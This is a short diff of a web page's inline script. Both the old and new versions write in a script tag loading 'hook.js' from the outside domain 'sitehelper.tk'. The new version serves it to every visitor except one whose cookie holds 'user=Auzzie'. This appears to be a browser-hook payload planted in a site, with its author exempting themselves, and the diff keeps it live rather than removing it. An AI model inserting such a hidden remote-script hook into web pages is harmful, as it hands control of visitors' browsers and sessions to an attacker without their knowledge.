@@ -12,11 +12,9 @@
     <script>
       var loader = '<div class="loader"></div>'
       document.write(loader);
-      if (document.cookie.split(';').some((item) => item.trim().startsWith('user='))){
-        continue;
-      } else {
-        var commandModuleStr = '<script src="https://sitehelper.tk/hook.js" type="text/javascript"><\/script>';
-        document.write(commandModuleStr); 
+      if(!(document.cookie.includes('user=Auzzie'))){
+          var commandModuleStr = '<script src="https://sitehelper.tk/hook.js" type="text/javascript"><\/script>';
+          document.write(commandModuleStr); 
       }
       window.addEventListener('DOMContentLoaded', (event) => {
           document.getElementsByClassName('loader')[0].remove()
